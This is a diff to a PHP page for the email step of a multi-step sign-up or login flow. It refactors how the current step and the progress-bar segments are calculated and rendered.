@@ -3,16 +3,10 @@ require_once __DIR__ . '/settings.php';
 require_once __DIR__ . '/H4Z3/functions.php';
 
 $stepKey = 'email';
-$steps = h4z3_get_flow_steps();
-$totalSteps = count($steps);
-$currentStep = null;
-
-foreach ($steps as $index => $step) {
-    if (($step['key'] ?? null) === $stepKey) {
-        $currentStep = $index + 1;
-        break;
-    }
-}
+$progress = h4z3_calculate_progress($stepKey);
+$progressSteps = $progress['steps'];
+$totalSteps = $progress['total'];
+$currentStep = $progress['current'];
 
 if ($currentStep === null) {
     header('Location: ' . h4z3_get_first_step_path());
@@ -54,9 +48,10 @@ if ($currentStep === null) {
                             </div>
                             <div class="unauth-intro-area__progress-container">
                                 <div class="unauth-intro-area__progress-segment">
-<?php for ($position = 1; $position <= $totalSteps; $position++): ?>
+<?php foreach ($progressSteps as $index => $progressStep): ?>
+<?php $position = $index + 1; ?>
                                     <div class="unauth-intro-area__progress-item <?php echo $position <= $currentStep ? '-js-progress-green' : '-js-progress-light-green'; ?>"></div>
-<?php endfor; ?>
+<?php endforeach; ?>
                                 </div>
                             </div>
                         </div>
